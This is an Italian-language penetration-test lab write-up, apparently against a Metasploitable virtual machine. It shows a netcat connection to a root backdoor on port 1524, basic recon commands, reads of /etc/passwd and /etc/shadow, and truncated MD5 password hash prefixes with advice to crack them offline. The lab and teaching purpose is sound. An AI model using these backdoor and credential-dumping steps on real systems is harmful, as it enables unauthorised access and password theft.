## Esecuzione — Output Completo

### Accesso Root e Ricognizione Iniziale
```bash
nc 10.10.10.101 1524         # connessione alla backdoor
whoami                       # root
uname -a                     # Linux metasploitable 2.6.24-16-server i686
pwd                          # /
ls /home/                    # ftp  msfadmin  service  user
```

![Root shell - whoami e uname](screenshots/meta-05-bindshell-root-whoami-uname.png)

### Utenti del Sistema — /etc/passwd
```bash
cat /etc/passwd
```
Utenti con shell interattiva (`/bin/bash`) trovati:
- `root` (uid 0)
- `msfadmin` (uid 1000) — utente principale
- `user` (uid 1001)
- `service` (uid 1002)

![/etc/passwd](screenshots/meta-06-etc-passwd.png)

### Hash Password — /etc/shadow
```bash
cat /etc/shadow
```

![/etc/shadow](screenshots/meta-07-etc-shadow.png)

**Analisi hash estratti:**

| Utente | Hash (prefisso) | Algoritmo |
|---|---|---|
| root | `$1$/avpfBJ1$...` | MD5 — debole |
| msfadmin | `$1$XN10Zj2c$...` | MD5 — debole |
| user | `$1$HESu9xrH$...` | MD5 — debole |

> **Nota tecnica:** Il prefisso `$1$` indica MD5-crypt.
> MD5 è considerato obsoleto per l'hashing delle password dal 2010.
> Questi hash sarebbero crackabili in pochi minuti con hashcat su GPU moderna.
> In un pentest reale: si salvano e si craccano offline.